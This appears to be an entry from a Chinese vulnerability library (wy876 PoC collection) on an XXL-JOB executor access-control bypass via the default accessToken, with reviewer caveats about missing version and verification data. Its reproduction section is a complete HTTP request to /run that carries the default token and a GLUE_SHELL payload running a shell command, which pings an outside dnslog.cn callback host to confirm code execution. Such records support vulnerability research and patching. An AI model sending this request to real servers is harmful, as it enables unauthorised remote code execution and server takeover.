---
fofa: ""
source: "wy876 漏洞文库"
product: "XXL-JOB / executor accessToken"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
fofa_unverified: "app.name="
title: "XXL-JOB默认accessToken权限绕过漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：只写XXL-JOB，缺精确版本且必须未改[默认令牌值已隐藏]"
side_effects: "未执行；本文需注意的操作影响：COVER_EARLY与jobId有副作用；固定大jobId运行任务，需标仅隔离验证及清理"
source_status: "unknown"
id: "vw-5b613e7f1bfe6870d8ff5257"
entity_id: "ve-5b613e7f1bfe6870d8ff5257"
schema_version: "1"
---

## 核对与使用边界

- 测绘字段处置：原 fofa 字段为残缺表达式、错误平台语法或当前解析器不支持的形式，原值完整保留到 fofa_unverified，不把它当作已校验查询或受影响资产证据。正文检索方法保留；具体问题见下列原审阅项。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：只写XXL-JOB，缺精确版本且必须未改\[默认令牌值已隐藏\]

代码与实验材料：完整GLUE_SHELL DNS请求，无响应，固定长度及公开域名

来源证据范围：语雀原文及wy876

- **结论使用边界（1）**：FOFA元数据不完整且平台错置；依据：fofa=app.name=，正文是Hunter app.name="XXL-JOB"。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **适用与权限边界（2）**：版本与验证证据缺失；依据：一个带默认token的请求不能证明所有版本/部署；没有DNS回调或响应。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **操作与副作用边界（3）**：COVER_EARLY与jobId有副作用；依据：固定大jobId运行任务，需标仅隔离验证及清理。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# XXL-JOB默认accessToken权限绕过漏洞

# 一、漏洞简介
<font style="color:rgb(0, 0, 0);"> XXL-JOB 默认配置下，用于调度通讯的 accessToken 不是随机生成的，而是使用 application.properties 配置文件中的默认值。在实际使用中如果没有修改默认值，攻击者可利用此绕过认证调用 executor，执行任意代码，从而获取服务器权限。</font>

# <font style="color:rgb(0, 0, 0);">二、影响版本</font>
+ <font style="color:rgb(0, 0, 0);">XXL-JOB</font>

# <font style="color:rgb(0, 0, 0);">三、资产测绘</font>
+ hunter`app.name="XXL-JOB"`
+ 特征

# 四、漏洞复现
```plain
POST /run HTTP/1.1
Content-Type: application/json
XXL-JOB-ACCESS-TOKEN: default_token
User-Agent: Java/1.8.0_391
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 323
Connection: close

{"jobId": 287040,"executorHandler": "demoJobHandler","executorParams": "demoJobHandler","executorBlockStrategy": "COVER_EARLY","executorTimeout": 0,"logId": 1,"logDateTime": 1586629003729,"glueType": "GLUE_SHELL","glueSource": "ping 0n3fio.dnslog.cn","glueUpdatetime": 1586699003758,"broadcastIndex": 0,"broadcastTotal": 0}
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ixd973mksvmz9c3w>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
